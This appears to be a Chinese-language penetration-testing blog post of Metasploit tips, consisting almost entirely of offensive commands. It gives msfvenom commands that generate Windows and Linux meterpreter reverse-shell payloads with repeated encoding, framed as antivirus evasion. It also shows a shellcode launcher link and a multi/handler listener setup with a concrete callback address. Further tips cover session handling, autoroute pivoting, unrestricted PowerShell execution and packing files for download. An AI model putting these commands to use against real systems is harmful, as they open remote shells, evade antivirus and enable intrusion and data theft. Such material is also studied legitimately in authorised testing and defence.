---
layout: post
title: metasploit 使用tips
categories: 渗透测试
tag: metasploit
---

## payload 生成 、 分离免杀

- 生成shellcode

    `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -ex86/shikata_ga_nai -i 5 -f raw > test.c`

- shellcode 加载器

    https://github.com/clinicallyinane/shellcode_launcher/
    `shellcode_launcher.exe -i test.c`

- linux 

    `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=< Your Port to Connect On> -f elf > shell.elf`

## meterpreter

- handle

    ```shell
    use exploit/multi/handle
    set payload windows/meterpreter/reverse_tcp
    set lport 4444
    set lhost 192.168.231.23
    run
    ```

- sessions 查看当前session
  - background 切换sessions 至后台
  - sessions -i 1  将session 1 调至前台

- run aotorouter -p  自动添加路由
  - post/multi/manage/autoroute自动添加路由

## powershell

- 开执行权限

    Set-ExecutionPolicy Unrestricted

## linux 

- 遇到文件下载失败 试试先打包 再下

    打包当前路径 tmp目录 tar -zcvf tmp.tar.gz ./tmp